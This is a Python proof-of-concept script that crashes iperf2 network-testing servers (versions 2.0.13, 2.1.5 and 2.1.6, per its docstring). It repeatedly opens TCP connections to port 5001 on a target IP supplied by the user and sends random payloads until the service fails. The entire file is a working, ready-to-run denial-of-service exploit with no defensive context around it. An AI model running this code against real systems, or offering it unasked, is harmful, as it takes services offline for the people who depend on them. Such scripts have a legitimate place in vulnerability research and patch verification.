
#! /usr/bin/python3
'''
    This script should crash iperf2
    after 10 seconds or so,
    depending on the version.

    Tested against versions:

      - 2.0.13
      - 2.1.5
      - 2.1.6

    Usage: python3 iperf2-crash.py <TARGET IP>

'''
import socket
import binascii
import time
import sys
import os

# Set to True for way too much output you don't need
DEBUG = False

while 1:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(.1)
#    p1 = os.urandom(40024)
    p1 = os.urandom(512) # Less is more

    try:
        s.connect((sys.argv[1], 5001)) # TODO: Change to argparse
    except ConnectionRefusedError as e:
        print("Err: %s\n"  % e)
        print("* * * * * * * * * * * * * * * * * \n")
        print("* * *  Target offline   * * * * * \n")
        print("* * * * * * * * * * * * * * * * * \n")
        sys.exit(0)

    try:
        if DEBUG:
            print("\n* * * * * *\n")
            print("* * * * DEBUG * * * * ")
            print("\n* * * * * * *\n")
            print("DBG: %s" % repr(binascii.b2a_hex(p1)))

        s.send(p1)
    except BrokenPipeError as e:
        print("Err: %s" % e)

    try:
        resp = s.recv(40024)
        #resp = s.recv(1024)
        #print("R1: %s" % (resp))
        #print("R1-hexed: %s" % binascii.hexlify(resp))
    except ConnectionResetError as e:
        if DEBUG:
            print("Err: %s" % e)
    except socket.timeout as e:
        if DEBUG:
            print("Err: %s" % e)

    s.close()
